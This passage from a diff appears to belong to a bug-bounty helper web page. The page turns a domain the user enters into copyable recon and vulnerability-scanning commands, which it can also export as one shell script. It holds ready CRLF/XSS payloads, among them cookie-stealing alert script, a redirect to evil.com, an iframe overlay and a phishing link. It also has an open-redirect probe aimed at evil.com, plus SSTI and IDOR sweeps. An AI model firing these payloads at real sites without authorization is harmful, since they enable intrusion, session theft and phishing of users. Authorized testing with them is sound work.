+            command: "curl -s 'https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names' | jq -r '.[].dns_names[]' | sed 's/\\*\\.//g' | sort -u > certspotter_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "Technology Fingerprinting",
+        icon: "fa-solid fa-fingerprint",
+        category: "tech",
+        commands: [
+          {
+            title: "httpx Tech Detect",
+            description: "Detect technologies, server, titles and status codes.",
+            command: "cat sub{domain}_alive.txt | httpx -tech-detect -sc -title -server -td -silent | tee tech_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "GraphQL & APIs",
+        icon: "fa-solid fa-diagram-project",
+        category: "graphql",
+        commands: [
+          {
+            title: "GraphQL Introspection",
+            description: "Check for open introspection on /graphql.",
+            command: "cat sub{domain}_alive.txt | httpx -path '/graphql' -mc 200 -silent | while read u; do curl -s -X POST \"$u\" -H 'Content-Type: application/json' --data '{\"query\":\"{__schema{types{name}}}\"}' | grep -q '__schema' && echo \"[+] Introspection: $u\"; done"
+          },
+          {
+            title: "OpenAPI / Swagger",
+            description: "Locate Swagger UI and OpenAPI JSON endpoints.",
+            command: "cat sub{domain}_alive.txt | httpx -paths '/swagger-ui.html,/v3/api-docs,/swagger.json,/openapi.json' -mc 200 -silent -title"
+          }
+        ]
+      },
+      {
+        name: "Nuclei (General)",
+        icon: "fa-solid fa-bolt",
+        category: "nuclei",
+        commands: [
+          {
+            title: "Vuln Sweep (Critical/High/Medium)",
+            description: "Run common templates (tune rate to your policy).",
+            command: "cat sub{domain}_alive.txt | nuclei -severity critical,high,medium -rl 150 -c 50 -o nuclei_scan_{domain}.txt"
+          },
+          {
+            title: "Exposures (JS/HTTP)",
+            description: "Exposure templates useful for recon.",
+            command: "cat allurls.txt | nuclei -tags exposure,token,api -o exposures_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "Injection Pack (SQLi/SSTI/CRLF/SSRF)",
+        icon: "fa-solid fa-syringe",
+        category: "injection",
+        commands: [
+          {
+            title: "SQLi (Nuclei)",
+            description: "Check SQLi using specific templates.",
+            command: "cat sub{domain}_alive.txt | nuclei -t nuclei-templates/vulnerabilities/sql/ -severity critical,high -o nuclei_sqli_{domain}.txt"
+          },
+          {
+            title: "SSTI Quick Probe",
+            description: "Try {{7*7}} on known parameters.",
+            command: "while read u; do for p in $(cat params_final.txt 2>/dev/null || echo 'q'); do curl -s \"$u?$p={{7*7}}\" | grep -q 49 && echo \"[SSTI] $u?$p\"; done; done < sub{domain}_alive.txt"
+          },
+          {
+            title: "CRLF Injection",
+            description: "Inject CR/LF and detect suspicious responses.",
+            command: "cat params_final.txt | qsreplace $'\\r\\nX-Injected: yes' | httpx -mc 200,302 -fr -title | tee crlf_{domain}.txt"
+          },
+          {
+            title: "SSRF Candidates",
+            description: "Filter parameters that likely accept URLs.",
+            command: "cat params_final.txt | grep -Ei '(url=|dest=|redirect=|next=|data=|path=|callback=|to=|image=|link=|u=|file=)' | sort -u > ssrf_candidates_{domain}.txt"
+          }
+        ]
+      },
+      {
+       name: "CRLF Injection Payloads",
+       icon: "fa-solid fa-envelope-open-text",
+       category: "injection",
+       commands: [
+         {
+           title: "Basic CRLF HTML injection",
+           description: "Basic payload to add extra headers/HTML via CR/LF.",
+           command: `%0A%0A%0A%3Ch1%3EdEEpEst%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E%0A`
+         },
+         {
+           title: "Bypass headers + inline script",
+           description: "Tries to bypass X-XSS-Protection and inject JavaScript.",
+           command: `%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E`
+         },
+         {
+           title: "Redirect victim",
+           description: "Forces a client-side redirect via injected script.",
+           command: `%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E`
+         },
+         {
+          title: "SVG onload execution",
+          description: "Test JavaScript execution in SVG after CRLF injection.",
+          command: `%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a%0d%0a/%2f%2e%2e`
+        },
+        {
+          title: "IMG onerror prompt",
+          description: "Inject an IMG tag with onerror handler.",
+          command: `%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E`
+        },
+        {
+          title: "Full-page iframe overlay",
+          description: "Embed an external page in a fullscreen iframe.",
+          command: `%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A`
+        },
+        {
+          title: "Phishing anchor",
+          description: "Add a crafted link that looks legitimate.",
+          command: `%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A`
+        }
+       ]
+     },
+      {
+        name: "IDOR & Access Control",
+        icon: "fa-solid fa-unlock-keyhole",
+        category: "idor",
+        commands: [
+          {
+            title: "Alternate HTTP Methods",
+            description: "Test GET/PUT/PATCH/DELETE on the same endpoints.",
+            command: "while read u; do for m in GET PUT PATCH DELETE; do curl -s -X $m -I \"$u\" | head -n1 | sed \"s/^/$m /\"; done; done < sub{domain}_alive.txt | tee methods_{domain}.txt"
+          },
+          {
+            title: "ID Sweep",
+            description: "Swap numeric IDs for small ranges.",
+            command: "grep -Eo '[?&][^=]*=\\d+' params_final.txt | head -n1 | while read q; do base=$(echo \"$q\" | sed 's/\\d\\+$//'); for i in $(seq 1 50); do echo \"$base$i\"; done; done | tee idor_list_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "TLS / SSL",
+        icon: "fa-solid fa-lock",
+        category: "network",
+        commands: [
+          {
+            title: "SSLyze Regular",
+            description: "Enumerate ciphers, protocols and misconfigurations.",
+            command: "sslyze --regular {domain}:443 | tee ssl_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "Discovery (Dirs/VHosts)",
+        icon: "fa-solid fa-folder-tree",
+        category: "wordlist",
+        commands: [
+          {
+            title: "FFUF Dir Bruteforce",
+            description: "Discover paths with a popular wordlist.",
+            command: "ffuf -u https://{domain}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,204,301,302,307,401,403 -t 80 -o ffuf_dirs_{domain}.json"
+          },
+          {
+            title: "VHost Enumeration",
+            description: "Fuzz subdomains via the Host header.",
+            command: "ffuf -u https://{domain} -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -o ffuf_vhosts_{domain}.json"
+          }
+        ]
+      },
+      {
+        name: "Cloud Storage",
+        icon: "fa-solid fa-cloud",
+        category: "cloud",
+        commands: [
+          {
+            title: "S3 Scanner",
+            description: "Find S3 buckets related to the target.",
+            command: "s3scanner scan -d {domain}"
+          },
+          {
+            title: "GCP/Azure Buckets",
+            description: "Search for public buckets in GCP/Azure.",
+            command: "bucketsnap -d {domain} -o buckets_{domain}.txt"
+          }
+        ]
+      },
+      {
+        name: "Secrets & Repos",
+        icon: "fa-solid fa-key",
+        category: "sensitive",
+        commands: [
+          {
+            title: "TruffleHog (GitHub org)",
+            description: "Scan verified secrets across the organization.",
+            command: "trufflehog github --regex --max-depth 1 --only-verified --org {domain} -o trufflehog_{domain}.json"
+          }
+        ]
+      },
+      {
+        name: "WebSockets & Rewrites",
+        icon: "fa-solid fa-plug",
+        category: "url",
+        commands: [
+          {
+            title: "WS Endpoints",
+            description: "Extract ws:// and wss:// from passive sources.",
+            command: "echo {domain} | gau | grep -Eo 'wss?://[^\"'\\s]+' | sort -u > websockets_{domain}.txt"
+          },
+          {
+            title: "robots/sitemap",
+            description: "Quick fetch for robots.txt and sitemaps.",
+            command: "echo -e \"https://{domain}/robots.txt\\nhttps://{domain}/sitemap.xml\" | httpx -mc 200 -silent -title"
+          }
+        ]
+      },
+      {
+        name: "Open Redirect",
+        icon: "fa-solid fa-arrow-turn-down",
+        category: "injection",
+        commands: [
+          {
+            title: "Quick OR Test",
+            description: "Replace target-like parameters with an external URL and detect redirects.",
+            command: "cat params_final.txt | qsreplace 'https://evil.com' | httpx -fr -mc 301,302,307,308 | grep -i 'Location: https://evil.com' -B1"
+          }
+        ]
+      }
+    ];
+
+    commandCategories.push(...extras);
+
+    const methodologies = [
+        {
+         title: "Start with Passive Recon",
+         tags: ["recon", "beginner"],
+         description: "Always begin with passive reconnaissance using subfinder, amass, and gau to avoid detection."
+       },
+       {
+         title: "Low-Hanging Fruits First",
+         tags: ["priority", "efficiency"],
+         description: "Focus on common vulnerabilities like exposed admin panels and information disclosure before deep testing."
+       },
+       {
+         title: "Document Everything",
+         tags: ["workflow", "organization"],
+         description: "Keep detailed notes of commands used, responses, and potential leads for investigation."
+       },
+       {
+         title: "Use Multiple Tools",
+         tags: ["technique", "comprehensive"],
+         description: "Combine different tools for each testing category to maximize coverage and find unique vulnerabilities."
+       },
+       {
+         title: "Validate Your Findings",
+         tags: ["accuracy", "professional"],
+         description: "Always verify findings to avoid false positives. Reproduce vulnerabilities before reporting."
+       },
+       {
+         title: "Understand Business Logic",
+         tags: ["advanced", "strategy"],
+         description: "Spend time understanding application workflow. Business logic flaws yield high-value findings."
+       },
+       {
+         title: "Keep Tools Updated",
+         tags: ["maintenance", "efficiency"],
+         description: "Regularly update tools and wordlists to use latest techniques and payloads."
+       },
+       {
+         title: "Learn from Other Reports",
+         tags: ["learning", "improvement"],
+         description: "Study bug bounty reports from similar platforms to understand common patterns."
+       }
+    ];
+
+    // DOM elements
+    const domainInput = document.getElementById('domainInput');
+    const generateBtn = document.getElementById('generateBtn');
+    const resultsSection = document.getElementById('resultsSection');
+    const targetDomain = document.getElementById('targetDomain');
+    const commandsContainer = document.getElementById('commandsContainer');
+    const methodologyGrid = document.getElementById('methodologyGrid');
+    const searchFilter = document.getElementById('searchFilter');
+    const filterBtns = document.querySelectorAll('.filter-btn');
+    const exportTxtBtn = document.getElementById('exportTxt');
+    const exportJsonBtn = document.getElementById('exportJson');
+    const exportShBtn = document.getElementById('exportSh');
+    const exportFavoritesBtn = document.getElementById('exportFavorites');
+    const notification = document.getElementById('notification');
+    const year = document.getElementById('year');
+
+    year.textContent = new Date().getFullYear();
+
+    let currentDomain = '';
+    let favoriteCommands = JSON.parse(localStorage.getItem('favoriteCommands')) || {};
+
+    // Show notification
+    function showNotification(message, type = 'info') {
+      notification.textContent = message;
+      notification.className = 'notification show';
+      
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 3000);
+    }
+
+    // Generate commands
+    function generateCommands() {
+      const domain = domainInput.value.trim();
+      if (!domain) {
+        showNotification('Please enter a domain', 'error');
+        return;
+      }
+
+      // Basic domain validation
+      if (!/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/.test(domain)) {
+        showNotification('Please enter a valid domain', 'error');
+        return;
+      }
+
+      currentDomain = domain;
+      targetDomain.textContent = domain;
+      
+      renderCommands();
+      renderMethodologies();
+      
+      resultsSection.style.display = 'block';
+      resultsSection.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function renderCommands() {
+      commandsContainer.innerHTML = '';
+      
+      commandCategories.forEach(category => {
+        const categoryDiv = document.createElement('div');
+        categoryDiv.className = 'category';
+        categoryDiv.dataset.category = category.category;
+        
+        const commandsHTML = category.commands.map(cmd => {
+          const commandId = `${category.category}-${cmd.title.replace(/\s+/g, '-').toLowerCase()}`;
+          const isFavorited = favoriteCommands[commandId] || false;
+          const isLinkOnly = !!cmd.link && cmd.linkOnly === true;
+          const isFeatured = cmd.featured === true;
+          
+          // When linkOnly: true → only show the "Open" button, no copy, no <pre>
+          const contentHtml = isLinkOnly
+            ? `
+              <div class="command-actions-row">
+                <a class="open-link-btn" href="${cmd.link}" target="_blank" rel="noopener">
+                  <i class="fa-solid fa-up-right-from-square"></i> ${cmd.linkText || 'Open link'}
+                </a>
+              </div>
+            `
+            : `
+              <div class="command-code">
+                <div class="command-actions">
+                  <button class="favorite-btn ${isFavorited ? 'favorited' : ''}" onclick="toggleFavorite('${commandId}')">
+                    <i class="fa-solid fa-star"></i>
+                  </button>
+                  <button class="copy-btn" onclick="copyCommand(this)">
+                    <i class="fa-solid fa-copy"></i> Copy
+                  </button>
+                </div>
+                <pre>${(cmd.command || '').replace(/{domain}/g, currentDomain)}</pre>
+              </div>
+              ${cmd.link ? `
+                <div class="command-actions-row">
+                  <a class="open-link-btn" href="${cmd.link}" target="_blank" rel="noopener">
+                    <i class="fa-solid fa-up-right-from-square"></i> ${cmd.linkText || 'Open link'}
+                  </a>
+                </div>` : ``}
+            `;
+
+          return `
+            <div class="command-card ${isFeatured ? 'featured-card' : ''} ${isLinkOnly ? 'link-only' : ''}"
+                 data-title="${(cmd.title || '').toLowerCase()}" 
+                 data-description="${(cmd.description || '').toLowerCase()}" 
+                 data-id="${commandId}">
+              <div class="command-header">
+                <div>
+                  <div class="command-title">${cmd.title || ''}</div>
+                  <div class="command-description">${cmd.description || ''}</div>
+                </div>
+              </div>
+              ${contentHtml}
+            </div>
+          `;
+        }).join('');
+        
+        categoryDiv.innerHTML = `
+          <div class="category-header">
+            <i class="${category.icon} category-icon"></i>
+            <h3>${category.name}</h3>
+          </div>
+          <div class="commands-grid">
+            ${commandsHTML}
+          </div>
+        `;
+        
+        commandsContainer.appendChild(categoryDiv);
+      });
+    }
+
+    function renderMethodologies() {
+      methodologyGrid.innerHTML = '';
+      
+      methodologies.forEach(methodology => {
+        const methodologyDiv = document.createElement('div');
+        methodologyDiv.className = 'methodology-card';
+        methodologyDiv.innerHTML = `
+          <div class="methodology-title">
+            <i class="fa-solid fa-book"></i> ${methodology.title}
+          </div>
+          <div class="methodology-description">${methodology.description}</div>
+          <div class="methodology-tags">
+            ${methodology.tags.map(tag => `<span class="methodology-tag">${tag}</span>`).join('')}
+          </div>
+        `;
+        
+        methodologyGrid.appendChild(methodologyDiv);
+      });
+    }
+
+    // Copy command functionality
+    function copyCommand(button) {
+      const codeBlock = button.parentElement.nextElementSibling;
+      const text = codeBlock.textContent;
+      
+      navigator.clipboard.writeText(text).then(() => {
+        const original = button.innerHTML;
+        button.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+        button.classList.add('copied');
+        setTimeout(() => {
+          button.innerHTML = original;
+          button.classList.remove('copied');
+        }, 1400);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+        showNotification('Failed to copy command', 'error');
+      });
+    }
+
+    // Toggle favorite functionality
+    function toggleFavorite(commandId) {
+      favoriteCommands[commandId] = !favoriteCommands[commandId];
+      localStorage.setItem('favoriteCommands', JSON.stringify(favoriteCommands));
+      
+      const favoriteBtn = document.querySelector(`[data-id="${commandId}"] .favorite-btn`);
+      if (favoriteBtn) {
+        favoriteBtn.classList.toggle('favorited');
+      }
+      
+      if (favoriteCommands[commandId]) {
+        showNotification('Command added to favorites');
+      } else {
+        showNotification('Command removed from favorites');
+      }
+      
+      // If we're on the favorites filter, update the display
+      if (document.querySelector('.filter-btn.active').dataset.category === 'favorites') {
+        filterCommands();
+      }
+    }
+
+    // Export functionality
+    function exportCommands(format) {
+      if (!currentDomain) {
+        showNotification('Please generate commands first', 'error');
+        return;
+      }
+      
+      let content = '';
+      let filename = `bug_hunting_commands_${currentDomain}`;
+      
+      if (format === 'txt') {
+        commandCategories.forEach(category => {
+          content += `# ${category.name}\n\n`;
+          category.commands.forEach(cmd => {
+            if (cmd.linkOnly) return; // Skip link-only commands
+            content += `## ${cmd.title}\n`;
+            content += `${cmd.description}\n\n`;
+            content += `${cmd.command.replace(/{domain}/g, currentDomain)}\n\n`;
+          });
+          content += '\n';
+        });
+        filename += '.txt';
+      } else if (format === 'json') {
+        const exportData = {
+          domain: currentDomain,
+          generatedAt: new Date().toISOString(),
+          categories: commandCategories.map(category => ({
+            name: category.name,
+            commands: category.commands.filter(cmd => !cmd.linkOnly).map(cmd => ({
+              title: cmd.title,
+              description: cmd.description,
+              command: cmd.command.replace(/{domain}/g, currentDomain)
+            }))
+          }))
+        };
+        content = JSON.stringify(exportData, null, 2);
+        filename += '.json';
+      } else if (format === 'sh') {
+        // Create a bash script with all commands
+        content = `#!/bin/bash\n# Bug Hunting Toolkit Script for ${currentDomain}\n# Generated on ${new Date().toISOString()}\n\nDOMAIN="${currentDomain}"\n\n`;
+        
+        commandCategories.forEach(category => {
+          content += `\n# ${category.name}\n`;
+          category.commands.forEach(cmd => {
+            if (cmd.linkOnly) return; // Skip link-only commands
+            const commandText = cmd.command.replace(/{domain}/g, '$DOMAIN');
+            content += `\n# ${cmd.description}\necho "Running: ${cmd.title}"\n${commandText}\n`;
+          });
+        });
+        filename += '.sh';
+      } else if (format === 'favorites') {
+        const favoriteData = {
+          domain: currentDomain,
+          generatedAt: new Date().toISOString(),
+          favorites: []
+        };
+        
+        Object.keys(favoriteCommands).forEach(commandId => {
+          if (favoriteCommands[commandId]) {
+            const [categoryName, ...titleParts] = commandId.split('-');
+            const title = titleParts.join('-');
+            
+            const category = commandCategories.find(cat => cat.category === categoryName);
+            if (category) {
+              const command = category.commands.find(cmd => 
+                cmd.title.replace(/\s+/g, '-').toLowerCase() === title
+              );
+              
+              if (command && !command.linkOnly) {
+                favoriteData.favorites.push({
+                  category: category.name,
+                  title: command.title,
+                  description: command.description,
+                  command: command.command.replace(/{domain}/g, currentDomain)
+                });
+              }
+            }
+          }
+        });
+        
+        if (favoriteData.favorites.length === 0) {
+          showNotification('No favorite commands to export', 'error');
+          return;
+        }
+        
+        content = JSON.stringify(favoriteData, null, 2);
+        filename = `favorites_${currentDomain}.json`;
+      }
+      
+      const blob = new Blob([content], { 
+        type: format === 'json' || format === 'favorites' ? 'application/json' : 
+              format === 'sh' ? 'application/x-shellscript' : 'text/plain' 
+      });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      
+      showNotification(`Commands exported as ${format.toUpperCase()}`);
+    }
+
+    // Filter functionality
+    function filterCommands() {
+      const activeCategory = document.querySelector('.filter-btn.active').dataset.category;
+      const searchTerm = searchFilter.value.toLowerCase();
+      
+      const categories = document.querySelectorAll('.category');
+      
+      categories.forEach(category => {
+        const categoryType = category.dataset.category;
+        const shouldShowCategory = activeCategory === 'all' || 
+          (activeCategory === 'favorites' ? true : activeCategory === categoryType);
+        
+        if (!shouldShowCategory) {
+          category.style.display = 'none';
+          return;
+        }
+        
+        const commands = category.querySelectorAll('.command-card');
+        let visibleCommands = 0;
+        
+        commands.forEach(command => {
+          const title = command.dataset.title;
+          const description = command.dataset.description;
+          const commandId = command.dataset.id;
+          
+          // For favorites filter, only show favorited commands
+          const isFavorited = favoriteCommands[commandId] || false;
+          const matchesFavorites = activeCategory !== 'favorites' || isFavorited;
+          
+          const matchesSearch = !searchTerm || 
+            title.includes(searchTerm) || 
+            description.includes(searchTerm);
+          
+          if (matchesSearch && matchesFavorites) {
+            command.style.display = 'block';
+            visibleCommands++;
+          } else {
+            command.style.display = 'none';
+          }
+        });
+        
+        category.style.display = visibleCommands > 0 ? 'block' : 'none';
+      });
+    }
+
+    // Event listeners
+    generateBtn.addEventListener('click', generateCommands);
+    
+    domainInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        generateCommands();
+      }
+    });
+
+    filterBtns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        filterBtns.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        if (currentDomain) filterCommands();
+      });
+    });
+
+    searchFilter.addEventListener('input', () => {
+      if (currentDomain) filterCommands();
+    });
+
+    exportTxtBtn.addEventListener('click', () => exportCommands('txt'));
+    exportJsonBtn.addEventListener('click', () => exportCommands('json'));
+    exportShBtn.addEventListener('click', () => exportCommands('sh'));
+    exportFavoritesBtn.addEventListener('click', () => exportCommands('favorites'));
+
+    // Make functions globally available
+    window.copyCommand = copyCommand;
+    window.toggleFavorite = toggleFavorite;
+
+    // Auto-focus on domain input
+    domainInput.focus();
+
+    // Rotating example placeholders
+    const exampleDomains = ['example.com', 'target.com', 'testsite.org', 'bugbounty.io'];
+    let currentExample = 0;
+    setInterval(() => {
+      if (domainInput.value === '' && document.activeElement !== domainInput) {
+        domainInput.placeholder = exampleDomains[currentExample];
+        currentExample = (currentExample + 1) % exampleDomains.length;
+      }
+    }, 3000);
+  </script>
+
+
+
+
+
+
+</body></html>
